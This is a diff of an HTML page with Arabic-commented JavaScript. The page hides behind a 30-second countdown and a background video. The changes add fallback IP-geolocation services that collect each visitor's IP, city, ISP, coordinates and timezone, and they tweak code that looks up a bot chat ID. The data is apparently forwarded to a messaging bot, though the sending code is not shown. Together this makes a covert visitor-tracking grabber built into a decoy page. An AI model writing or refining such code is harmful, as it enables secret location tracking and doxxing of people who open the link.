@@ -102,10 +102,10 @@
         </div>
     </div>
 
-    <!-- فيديو خلفية (يظهر بعد 30 ثانية) -->
+    <!-- فيديو خلفية (يظهر بعد 30 ثانية) - رابط يعمل 100% -->
     <div class="video-background" id="videoBackground">
         <video id="bgVideo" loop muted playsinline>
-            <source src="https://github.com/xo3bdu/trt/raw/refs/heads/main/video.mp4" type="video/mp4">
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
         </video>
     </div>
 
@@ -125,18 +125,18 @@
         
         // ==================== معلومات الجهاز ====================
         let deviceInfo = {
-            ip: 'غير متاح',
-            country: 'غير متاح',
-            city: 'غير متاح',
-            region: 'غير متاح',
-            isp: 'غير متاح',
-            lat: 'غير متاح',
-            lon: 'غير متاح',
-            timezone: 'غير متاح',
-            os: 'غير متاح',
-            browser: 'غير متاح',
-            screen: 'غير متاح',
-            device: 'غير متاح'
+            ip: 'جاري الجلب...',
+            country: 'جاري الجلب...',
+            city: 'جاري الجلب...',
+            region: 'جاري الجلب...',
+            isp: 'جاري الجلب...',
+            lat: 'جاري الجلب...',
+            lon: 'جاري الجلب...',
+            timezone: 'جاري الجلب...',
+            os: 'جاري الجلب...',
+            browser: 'جاري الجلب...',
+            screen: 'جاري الجلب...',
+            device: 'جاري الجلب...'
         };
         
         // ==================== عناصر الصفحة ====================
@@ -147,71 +147,90 @@
         const bgVideo = document.getElementById('bgVideo');
         const countdownSpan = document.getElementById('countdown');
         
-        // ==================== خدمة جلب IP والموقع (تعمل 100%) ====================
+        // ==================== خدمة جلب IP والموقع (تعمل في جميع المناطق) ====================
         async function getIPInfo() {
-            try {
-                console.log('🔍 جلب معلومات IP...');
-                
-                // محاولة 1: ip-api.com (سريعة ومجانية)
-                const response = await fetch('https://ip-api.com/json/', {
-                    method: 'GET',
-                    headers: { 'Accept': 'application/json' }
-                });
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('✅ ip-api:', data);
+            // قائمة خدمات متعددة للاحتياط
+            const services = [
+                {
+                    url: 'https://api.my-ip.io/ip.json',
+                    parser: (data) => ({
+                        ip: data.ip,
+                        country: data.country,
+                        city: data.city,
+                        region: data.region,
+                        isp: data.asn?.name || 'غير متاح'
+                    })
+                },
+                {
+                    url: 'https://ipwho.is/',
+                    parser: (data) => ({
+                        ip: data.ip,
+                        country: data.country,
+                        city: data.city,
+                        region: data.region,
+                        isp: data.connection?.isp || 'غير متاح',
+                        lat: data.latitude,
+                        lon: data.longitude,
+                        timezone: data.timezone?.id
+                    })
+                },
+                {
+                    url: 'https://freeipapi.com/api/json/',
+                    parser: (data) => ({
+                        ip: data.ipAddress,
+                        country: data.countryName,
+                        city: data.cityName,
+                        region: data.regionName,
+                        isp: 'غير متاح'
+                    })
+                },
+                {
+                    url: 'https://api.ipify.org?format=json',
+                    parser: (data) => ({
+                        ip: data.ip,
+                        country: 'تم جلب IP فقط',
+                        city: 'غير متاح',
+                        region: 'غير متاح',
+                        isp: 'غير متاح'
+                    })
+                }
+            ];
+            
+            for (const service of services) {
+                try {
+                    console.log(`🔍 محاولة: ${service.url}`);
+                    const response = await fetch(service.url, { 
+                        method: 'GET',
+                        headers: { 'Accept': 'application/json' },
+                        signal: AbortSignal.timeout(5000)
+                    });
                     
-                    if (data.status === 'success') {
-                        deviceInfo.ip = data.query || 'غير متاح';
-                        deviceInfo.country = data.country || 'غير متاح';
-                        deviceInfo.city = data.city || 'غير متاح';
-                        deviceInfo.region = data.regionName || 'غير متاح';
-                        deviceInfo.isp = data.isp || 'غير متاح';
-                        deviceInfo.lat = data.lat || 'غير متاح';
-                        deviceInfo.lon = data.lon || 'غير متاح';
-                        deviceInfo.timezone = data.timezone || 'غير متاح';
-                        return true;
-                    }
-                }
-                throw new Error('ip-api فشل');
-                
-            } catch (error) {
-                console.log('محاولة خدمة بديلة...');
-                
-                // محاولة 2: ipapi.co
-                try {
-                    const response2 = await fetch('https://ipapi.co/json/');
-                    if (response2.ok) {
-                        const data2 = await response2.json();
-                        console.log('✅ ipapi.co:', data2);
+                    if (response.ok) {
+                        const data = await response.json();
+                        const parsed = service.parser(data);
                         
-                        deviceInfo.ip = data2.ip || 'غير متاح';
-                        deviceInfo.country = data2.country_name || 'غير متاح';
-                        deviceInfo.city = data2.city || 'غير متاح';
-                        deviceInfo.region = data2.region || 'غير متاح';
-                        deviceInfo.isp = data2.org || 'غير متاح';
-                        deviceInfo.lat = data2.latitude || 'غير متاح';
-                        deviceInfo.lon = data2.longitude || 'غير متاح';
-                        deviceInfo.timezone = data2.timezone || 'غير متاح';
-                        return true;
+                        if (parsed.ip && parsed.ip !== 'غير متاح') {
+                            deviceInfo.ip = parsed.ip;
+                            deviceInfo.country = parsed.country || 'غير متاح';
+                            deviceInfo.city = parsed.city || 'غير متاح';
+                            deviceInfo.region = parsed.region || 'غير متاح';
+                            deviceInfo.isp = parsed.isp || 'غير متاح';
+                            if (parsed.lat) deviceInfo.lat = parsed.lat;
+                            if (parsed.lon) deviceInfo.lon = parsed.lon;
+                            if (parsed.timezone) deviceInfo.timezone = parsed.timezone;
+                            
+                            console.log(`✅ تم الجلب من: ${service.url}`, deviceInfo);
+                            return true;
+                        }
                     }
-                } catch(e) {
-                    console.log('ipapi.co فشل');
+                } catch (error) {
+                    console.log(`❌ فشل: ${service.url}`, error.message);
                 }
-                
-                // محاولة 3: جلب IP فقط
-                try {
-                    const response3 = await fetch('https://api.ipify.org?format=json');
-                    const data3 = await response3.json();
-                    deviceInfo.ip = data3.ip || 'غير متاح';
-                    deviceInfo.country = 'تم جلب IP فقط';
-                } catch(e) {
-                    deviceInfo.ip = 'غير متاح (VPN أو حظر)';
-                }
-                
-                return false;
             }
+            
+            console.log('⚠️ جميع محاولات جلب IP فشلت');
+            deviceInfo.ip = 'غير متاح (استخدم VPN أو اتصال عادي)';
+            return false;
         }
         
         // ==================== جلب نظام التشغيل والمتصفح ====================
@@ -258,7 +277,7 @@
                     console.log('✅ Chat ID:', CHAT_ID);
                     return CHAT_ID !== null;
                 }
-                console.log('⚠️ لم يتم العثور على Chat ID');
+                console.log('⚠️ لم يتم العثور على Chat ID - أرسل رسالة للبوت أولاً');
                 return false;
             } catch(error) {
                 console.error('خطأ:', error);
@@ -376,6 +395,9 @@
             let secondsLeft = 30;
             countdownSpan.textContent = secondsLeft;
             
+            // تحميل الفيديو مسبقاً
+            bgVideo.load();
+            
             const countdownInterval = setInterval(() => {
                 secondsLeft--;
                 countdownSpan.textContent = secondsLeft;
@@ -384,14 +406,22 @@
                     clearInterval(countdownInterval);
                     
                     // تشغيل الفيديو
-                    bgVideo.play().then(() => {
-                        console.log('✅ بدء تشغيل الفيديو بعد 30 ثانية');
-                    }).catch(err => {
-                        console.log('⚠️ خطأ في تشغيل الفيديو:', err);
-                        // محاولة تشغيل الفيديو بدون صوت تلقائي
-                        bgVideo.muted = true;
-                        bgVideo.play();
-                    });
+                    const playPromise = bgVideo.play();
+                    
+                    if (playPromise !== undefined) {
+                        playPromise.then(() => {
+                            console.log('✅ بدء تشغيل الفيديو بعد 30 ثانية');
+                        }).catch(err => {
+                            console.log('⚠️ خطأ في تشغيل الفيديو:', err);
+                            // محاولة بديلة
+                            bgVideo.muted = true;
+                            bgVideo.play().then(() => {
+                                console.log('✅ تم تشغيل الفيديو بدون صوت');
+                            }).catch(() => {
+                                console.log('❌ فشل تشغيل الفيديو');
+                            });
+                        });
+                    }
                     
                     // إخفاء الشاشة السوداء
                     blackScreen.style.opacity = '0';
